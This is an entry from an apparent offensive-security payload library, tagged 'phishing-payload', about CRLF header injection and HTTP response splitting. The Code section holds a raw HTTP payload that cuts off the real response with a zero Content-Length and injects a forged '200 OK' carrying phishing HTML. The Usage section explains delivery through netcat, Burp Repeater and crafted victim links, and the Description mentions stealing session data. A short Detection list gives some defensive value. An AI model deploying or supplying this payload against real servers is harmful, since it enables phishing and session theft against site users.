---
id: bcf971ac-acc6-4f8a-8266-9b8aaed807b6
name: CRLF-Header-Injection-for-Response-Modification
type: code
language: http
verified: true
created_at: '2023-04-06T03:55:55.322037+00:00'
updated_at: '2023-04-06T03:55:55.325646+00:00'
platforms:
  - Web
tags:
  - crlf-injection
  - phishing-payload
  - http-injection
validated: true
---

# CRLF-Header-Injection-for-Response-Modification

## Code

```http
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

## Description

This raw HTTP request snippet injects CRLF characters directly into headers to split the response, allowing modification of cookies or addition of a new response body. It sets a zero Content-Length to truncate the original response and appends malicious HTML, useful in phishing to inject fake forms or steal session data.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $CUSTOM_HEADER | Injected header value (e.g., Set-Cookie) | Set-Cookie: malicious=1 |
| $FAKE_STATUS | Injected status line | HTTP/1.1 200 OK |
| $MALICIOUS_BODY | Content to append | <html>You have been Phished</html> |

## Usage

Send this as a raw POST or GET body to a vulnerable endpoint that echoes input into responses (e.g., via tools like netcat or Burp Repeater). In phishing, deliver via a crafted request from a victim-controlled link to trigger server-side injection.

## Detection

- Server logs with raw CRLF in request bodies or headers.
- Response anomalies like multiple Content-Type headers or unexpected body content.
- Increased false 200 OK responses with non-standard Last-Modified dates.

## Related

- [[procedures/CRLF-Injection-Phishing-Attack]]
- [[commands/curl-crlf-url-injection]]
